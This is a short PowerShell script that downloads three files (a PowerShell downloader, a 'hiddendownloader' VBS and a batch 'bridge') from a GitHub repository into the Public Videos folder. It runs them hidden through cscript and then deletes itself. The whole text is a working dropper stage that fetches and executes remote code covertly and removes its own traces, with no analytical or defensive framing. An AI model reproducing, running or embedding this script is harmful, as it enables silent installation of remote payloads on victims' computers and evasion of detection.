Invoke-WebRequest 'https://github.com/RaupenInspektor/Server/raw/main/downloader.ps1' -OutFile 'C:\Users\Public\Videos\downloader.ps1'
Invoke-WebRequest 'https://github.com/RaupenInspektor/Server/raw/main/hiddendownloader.vbs' -OutFile 'C:\Users\Public\Videos\hiddendownloader.vbs'
Invoke-WebRequest 'https://github.com/RaupenInspektor/Server/raw/main/bridge.bat' -OutFile 'C:\Users\Public\Videos\bridge.bat'
$BatchFilePath = "C:\Users\Public\Videos\bridge.bat"
$ParameterFilePath = "C:\Users\Public\Videos\downloader.ps1"

& cscript //nologo "C:\Users\Public\Videos\hiddendownloader.vbs" $BatchFilePath $ParameterFilePath
Remove-Item $PSCommandPath -Force 